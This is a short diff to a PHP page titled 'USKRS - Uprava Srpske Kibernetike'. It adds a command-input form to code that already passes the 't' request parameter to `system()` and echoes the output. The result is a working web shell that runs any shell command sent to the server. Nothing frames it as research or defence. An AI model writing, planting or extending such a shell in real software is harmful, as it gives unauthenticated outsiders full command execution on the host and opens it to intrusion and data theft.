@@ -1,4 +1,11 @@
 <?php
+
+echo '<form>
+			<input name="t" type="search" class="inp" placeholder="Unesi komandu" autofocus>
+			<input type="submit" value="ENTER">
+		</form>';
+
+
 echo '<pre>USKRS - Uprava Srpske Kibernetike</pre>';
 
 echo '<pre>';
@@ -19,4 +26,8 @@ echo '<pre>';
 echo 'terminal<hr />';
 echo system($_GET['t']);
 echo '</pre>';
+
+
+
+
 ?>
